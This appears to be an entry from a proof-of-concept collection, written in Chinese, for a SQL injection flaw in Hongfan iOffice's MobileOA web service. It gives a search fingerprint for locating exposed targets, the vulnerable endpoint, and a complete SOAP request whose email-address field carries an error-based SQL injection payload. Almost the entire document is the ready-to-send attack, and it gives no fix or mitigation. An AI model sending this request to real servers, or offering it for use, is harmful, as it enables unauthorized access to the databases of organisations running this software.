# 红帆OAMobileOA存在SQLl注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="红帆-ioffice"`
- **请求**：`POST /iOffice/prg/set/wss/MobileOA.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GeMrNewData xmlns="http://tempuri.org/">
<MobileOAEmailAddress>' AND 5079 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5079=5079) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(98)+CHAR(113)))-- eqJq</MobileOAEmailAddress>
</GeMrNewData>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—